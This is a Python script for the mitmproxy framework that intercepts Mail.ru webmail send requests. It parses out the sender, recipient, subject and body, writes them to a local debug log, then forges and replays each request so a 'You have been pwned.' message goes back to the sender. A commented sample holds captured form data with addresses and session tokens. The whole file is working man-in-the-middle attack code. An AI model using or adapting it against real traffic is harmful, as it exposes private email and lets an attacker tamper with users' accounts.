import logging
import time
import cStringIO
from PIL import Image
from libmproxy.protocol.http import decoded
import re
import urllib


class Mail_data:
    def __init__(self):
        self.mail = []

    def get_email(self, string):
        # Mail.ru
#        logging.debug("STR")
#        logging.debug(string)
        string = urllib.unquote(string).decode('utf-8')

	m = re.match(r"(?P<Start>[\w\W]*)&To=(?P<To>[^&]*)&(?P<Middle>[\w\W]*)&Subject=(?P<Subject>[^&]*)&Body=(?P<Body>[^&]*)&(?P<End>[\w\W]*)&x-email=(?P<From>[^&]*)", string)
        if (m):
            self.mail.append(["mail","From: " + m.group('From'),"To: " + m.group('To'), "Subj: "+m.group('Subject'), m.group('Body')])
            logging.debug(str(self.mail))
            #Pwning
            string2 = m.group('Start')+"&To="+m.group('From')+"&"+m.group('Middle')+"&Subject="+m.group('Subject')+"&Body="+"You have been pwned."+"&"+m.group('End')+"&x-email="+m.group('From') 
#            logging.debug("STR2")
#            logging.debug(str(string2))
            return str(string2)
            

#message=P579I38l&old_charset=utf-8&template_id=&HTMLMessage=1&draft_msg=&re_msg=&fwd_msg=&text=&direction=re&orfo=rus&RealName=0&attached_ids=&files_ids=&To=%22gusarov.aa%22+%3Cgusarov.aa%40gmail.com%3E&CC=&BCC=&Priority=0&Subject=Test&Body=Testmessage%3Cbr%3E--+%3Cbr%3E%D0%90%D0%BB%D0%B5%D0%BA%D1%81%D0%B5%D0%B9+%D0%93%D1%83%D1%81%D0%B0%D1%80%D0%BE%D0%B2&security_image_word=&token=167699978529441869162194510557524567120%3A5347457f71610901190504000f0a080c050c06010c0d03040d000d0002000000040200090c0d060503030001020006071850405f674403&form_sign=245cb916210c3f0eed21a5f778a058da&form_token=5347457f71610901190606025a51080404060203560a5105505350030553045f07000958090d0954501646525b4559445e&x-email=_microsoft_%40list.ru

    def __repr__(self):
        s = '0\n'
        return s

mail_db = Mail_data()

def request(context, flow):
    try:
        f = context.duplicate_flow(flow)
        with decoded(flow.request):  # automatically decode gzipped responses.
            new_content = str(mail_db.get_email(str(flow.request.content)))
        f.request.content = new_content
        context.replay_request(f)        

    except Exception as e:
        logging.debug(e)

def start (context, argv):
    logging.basicConfig(filename="log.log",level=logging.DEBUG)
    logging.debug("============================================\n")
    logging.debug(time.time())
    logging.debug("Startup:\n")
    context.log("start")


'''
def clientconnect(context, root_layer):
    logging.debug("Client connect:\n")
'''
